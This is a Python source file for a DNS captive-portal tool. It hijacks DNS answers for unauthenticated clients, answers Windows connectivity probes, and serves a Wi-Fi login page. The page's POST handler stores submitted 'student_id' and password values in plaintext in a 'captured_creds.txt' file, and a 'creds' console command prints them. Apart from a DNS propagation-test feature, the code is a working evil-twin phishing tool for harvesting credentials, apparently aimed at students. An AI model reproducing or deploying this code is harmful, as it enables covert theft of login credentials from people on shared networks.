import socket
import threading
import time
import os
import base64
import logging
import dns.resolver
from dnslib import DNSRecord, RR, QTYPE, A
from flask import Flask, request, make_response
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# --- Logging Setup ---
log_flask = logging.getLogger('werkzeug')
log_flask.setLevel(logging.ERROR)

def get_dynamic_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

# --- Configuration ---
HOST = get_dynamic_ip()
PORT = 53
UPSTREAM_DNS = '8.8.8.8'
UPSTREAM_PORT = 53
SOCKET_TIMEOUT = 3.0
CACHE_CLEAN_INTERVAL = 300
LOG_FILE = "DNS.log"
CREDS_FILE = "captured_creds.txt"
HTML_FILE = "index.html"

# DoH Configuration
DOH_PORT = 443
DOH_ENDPOINT = "/dns-query"

# Full Global Server List for Propagation Test
GLOBAL_SERVERS = {
    "Google Primary": "8.8.8.8", "Google Secondary": "8.8.4.4",
    "Cloudflare": "1.1.1.1", "Quad9": "9.9.9.9",
    "OpenDNS Primary": "208.67.222.222", "OpenDNS Secondary": "208.67.220.220",
    "Level3 Primary": "4.2.2.1", "Level3 Secondary": "4.2.2.2",
    "AdGuard": "94.140.14.14", "Comodo": "8.26.56.26",
    "ControlD": "76.76.2.0", "NextDNS": "45.90.28.190",
    "CleanBrowsing": "185.228.168.9", "Yandex": "77.88.8.8",
    "Neustar": "156.154.70.1", "Hurricane Electric": "74.82.42.42",
    "Verisign Primary": "64.6.64.6", "Verisign Secondary": "64.6.65.6"
}

# --- State Management ---
REDIRECT_ALL = False
WHITELISTED_IPS = set()  # Set to track IPs that have "logged in"
cache = {}
cache_lock = threading.Lock()
log_lock = threading.Lock()

def log(message):
    with log_lock:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {message}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry + "\n")

# --- Active Cache Cleaner ---
def cache_cleaner():
    while True:
        time.sleep(CACHE_CLEAN_INTERVAL)
        now = time.time()
        removed = 0
        with cache_lock:
            expired_keys = [k for k, v in cache.items() if v[1] < now]
            for key in expired_keys:
                del cache[key]
                removed += 1
        if removed > 0: log(f"Cache cleanup: removed {removed} entries.")

# --- DNS Core Logic ---
def forward_query(data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.sendto(data, (UPSTREAM_DNS, UPSTREAM_PORT))
        response, _ = sock.recvfrom(4096)
        return response
    except Exception: return None
    finally: sock.close()

def process_dns_logic(data, client_ip, protocol="UDP"):
    try:
        request_pkt = DNSRecord.parse(data)
        qname = str(request_pkt.q.qname)
        qtype = request_pkt.q.qtype

        # 1. WHITELIST & REDIRECT CHECK
        # Only hijack if REDIRECT_ALL is on AND the client hasn't logged in yet
        if REDIRECT_ALL and qtype == QTYPE.A and client_ip not in WHITELISTED_IPS:
            log(f"HIJACK [{protocol} {client_ip}]: {qname} -> {HOST}")
            reply = request_pkt.reply()
            # We use a very low TTL (5s) so that as soon as they log in, their cache clears
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=5))
            return reply.pack()

        # 2. CACHE LOOKUP (For whitelisted users or when redirect is OFF)
        with cache_lock:
            if (qname, qtype) in cache:
                raw_resp, expiry = cache[(qname, qtype)]
                if time.time() < expiry:
                    cached_resp = DNSRecord.parse(raw_resp)
                    cached_resp.header.id = request_pkt.header.id
                    return cached_resp.pack()

        # 3. RESOLVE UPSTREAM
        response_data = forward_query(data)
        if response_data:
            with cache_lock:
                cache[(qname, qtype)] = (response_data, time.time() + 60)
            return response_data
    except Exception as e: log(f"Error processing {protocol}: {e}")
    return None

# --- UDP Server ---
def handle_dns_client(data, addr, sock):
    # Pass the client IP to the logic for whitelisting checks
    resp = process_dns_logic(data, addr[0], f"UDP")
    if resp:
        sock.sendto(resp, addr)

def run_udp_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((HOST, PORT))
        log(f"UDP Server Active on {HOST}:{PORT}")
        while True:
            data, addr = sock.recvfrom(512)
            threading.Thread(target=handle_dns_client, args=(data, addr, sock), daemon=True).start()
    except PermissionError:
        print("[!] Access Denied: Port 53 requires sudo.")
        os._exit(1)

# --- DoH & Web Portal ---
app = Flask(__name__)
@app.route(DOH_ENDPOINT, methods=['GET', 'POST'])
def doh_handler():
    dns_query = None
    if request.method == 'POST': dns_query = request.data
    elif request.method == 'GET':
        dns_b64 = request.args.get('dns')
        if dns_b64: dns_query = base64.urlsafe_b64decode(dns_b64 + '=' * (4 - len(dns_b64) % 4))
    if not dns_query: return "Bad Request", 400
    
    resp_data = process_dns_logic(dns_query, request.remote_addr, protocol="DoH")
    if resp_data:
        r = make_response(resp_data)
        r.headers['Content-Type'] = 'application/dns-message'
        return r
    return "Timeout", 504

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Mandatory Windows 10 NCSI probe triggers
        if "connecttest.txt" in self.path or "ncsi.txt" in self.path:
            self.send_response(200); self.send_header('Content-type', 'text/plain'); self.end_headers()
            self.wfile.write(b"Action Required")
            return
        
        # Serve the index.html portal
        self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
        if os.path.exists(HTML_FILE):
            with open(HTML_FILE, "rb") as f: self.wfile.write(f.read())
        else: self.wfile.write(b"<h1>Portal</h1><p>Login to connect to Wi-Fi.</p>")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)
        user = params.get('student_id', ['N/A'])[0]
        pw = params.get('password', ['N/A'])[0]
        client_ip = self.client_address[0]

        # 1. CAPTURE & WHITELIST
        with open(CREDS_FILE, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] IP: {client_ip} | ID: {user} | Pass: {pw}\n")
        
        WHITELISTED_IPS.add(client_ip)
        log(f"LOGIN SUCCESS: {client_ip} has been whitelisted and granted access.")

        # 2. Redirect/Success Screen
        self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
        self.wfile.write(b"<h1>Connected!</h1><p>Authentication successful. You now have full internet access.</p>")
    
    def log_message(self, format, *args): pass

# --- Startup & CLI ---
if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    print("=" * 60)
    print(f"DNS CAPTIVE PORTAL PRO-EDITION")
    print(f"Interface: {HOST}")
    print("Commands: 'redirect', 'creds', 'clear', 'exit' or [domain]")
    print("=" * 60)

    # Launching Services
    threading.Thread(target=cache_cleaner, daemon=True).start()
    threading.Thread(target=run_udp_server, daemon=True).start()
    threading.Thread(target=lambda: app.run(host=HOST, port=443, ssl_context='adhoc', use_reloader=False), daemon=True).start()
    threading.Thread(target=lambda: HTTPServer((HOST, 80), CaptivePortalHandler).serve_forever(), daemon=True).start()

    while True:
        try:
            cmd = input("\ndns-cli> ").strip().lower()
            if not cmd: continue
            if cmd in ['exit', 'quit']: break
            
            elif cmd == 'redirect':
                REDIRECT_ALL = not REDIRECT_ALL
                print(f"[*] Redirect Mode: {'ENABLED' if REDIRECT_ALL else 'DISABLED'}")
            
            elif cmd == 'creds':
                if os.path.exists(CREDS_FILE):
                    print(f"\n--- CAPTURED CREDS ---\n")
                    with open(CREDS_FILE, 'r') as f: print(f.read())
                else: print("[!] No creds yet.")

            elif cmd == 'clear':
                WHITELISTED_IPS.clear()
                print("[*] Whitelist cleared. All clients are now blocked again.")
            
            else:
                # Fallback: Run Propagation Test
                print(f"\n--- Propagation Test: {cmd} ---")
                print(f"{'Provider':<20} | {'Status/IP':<15} | {'Latency'}")
                print("-" * 55)
                for name, ip in GLOBAL_SERVERS.items():
                    res = dns.resolver.Resolver(configure=False); res.nameservers = [ip]; res.timeout = 1.2
                    start = time.time()
                    try:
                        ans = res.resolve(cmd, 'A')
                        lat = round((time.time() - start) * 1000, 2)
                        print(f"{name:<20} | {ans[0].to_text():<15} | {lat}ms")
                    except: print(f"{name:<20} | Timeout          | n/a")
        except KeyboardInterrupt: break

    print("\nSHUTDOWN: Stopping all threads...")
